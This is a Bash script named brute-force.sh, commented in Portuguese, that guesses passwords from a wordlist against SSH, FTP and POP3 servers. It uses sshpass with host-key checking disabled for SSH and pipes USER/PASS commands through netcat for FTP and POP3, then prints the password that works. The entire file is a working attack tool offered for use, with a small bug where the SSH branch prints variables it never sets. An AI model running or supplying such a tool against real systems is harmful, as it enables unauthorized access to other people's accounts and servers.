#!/bin/bash

echo ""
echo " _                _              __                          _"
echo "| |__  _ __ _   _| |_ ___       / _| ___  _ __ ___ ___   ___| |_"
echo "| '_ \| '__| | | | __/ _ \_____| |_ / _ \| '__/ __/ _ \ / __| '_ \ "
echo "| |_) | |  | |_| | ||  __/V.1.1|  _| (_) | | | (_|  __/_\__ \ | | |"
echo "|_.__/|_|   \__,_|\__\___|     |_|  \___/|_|  \___\___(_)___/_| |_|"
echo "instagram: @rafael_cyber1"
echo""

if [ "$1" == "-ssh" ]; then
  server=$2
  porta=$3
  wordlist=$4
  # Loop para tentar cada senha na wordlist
  for pass in $(cat "$wordlist"); do
      echo "Testing: [$port] Username: $user | Password: $pass"
      # Usa sshpass para fornecer a senha automaticamente
      # StrictHostKeyChecking=no desativar a verificação da chave do host
      # -o UserKnownHostsFile=/dev/null evita salvar a chave do host no arquivo known_hosts
      sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p "$porta" "$server" exit 2>/dev/null
      # Verifica se a conexão foi bem-sucedida
      if [ $? -eq 0 ]; then # armazena o código de saída do último comando. $? -eq 0 comparação numérica que verifica se o valor de $? é igual a 0
      # 0 é uma verificação comum em scripts Bash para determinar se o último comando foi executado com sucesso.
          echo -e "\033[0;32m\nCorrect: [$port] Username: $user | Password: $pass\n\033[0m"
          exit 0 # Quando o script encontra a senha correta e executa exit
      fi
  done

elif [ "$1" == "-ftp" ]; then
  user=$2
  server=$3
  port=$4
  wordlist=$5
  # Ler o arquivo de senhas e tentar cada uma
  for pass in $(cat "$wordlist"); do
      echo "Testing: [$port] Username: $user | Password: $pass"
      result=$(echo -e "USER $user\nPASS $pass\nQUIT" | nc $server $port)
      # echo vai passar os parametros de login pro netcat e result recebe os resultados
      # USER usuario em seguida ele pede a senha que sera passada em PASS e por fim QUI pra sair e continuar o loop
      if [[ $result == *"230"* ]]; then # 230 significa que o login foi OK
          echo -e "\033[0;32m\nCorrect: [$port] Username: $user | Password: $pass\n\033[0m"
          exit 0 # Quando o script encontra a senha correta e executa exit
      fi
  done

elif [ "$1" == "-pop3" ]; then
  user=$2
  server=$3
  port=$4
  wordlist=$5
  # Ler o arquivo de senhas e tentar cada uma
  for pass in $(cat "$wordlist"); do
      echo "Testing: [$port] Username: $user | Password: $pass"
      result=$(echo -e "USER $user\nPASS $pass\nQUIT" | nc $server $port)
      # echo vai passar os parametros de login pro netcat e result recebe os resultados
      # USER usuario em seguida ele pede a senha que sera passada em PASS e por fim QUI pra sair e continuar o loop
      if [[ $result == *"Logged in"* ]]; then # Logged in significa que o login foi OK
          echo -e "\033[0;32m\nCorrect: [$port] Username: $user | Password: $pass\n\033[0m"
          exit 0 # Quando o script encontra a senha correta e executa exit
      fi
  done

elif [ "$1" == "-h" ]; then
  echo -e "\nbrute-force.sh -ssh [user@127.0.0.1] [port] [wordlist]"
  echo "brute-force.sh -ftp [user] [server] [port] [wordlist]"
  echo -e "brute-force.sh -pop3 [user] [server] [port] [wordlist]\n"
fi
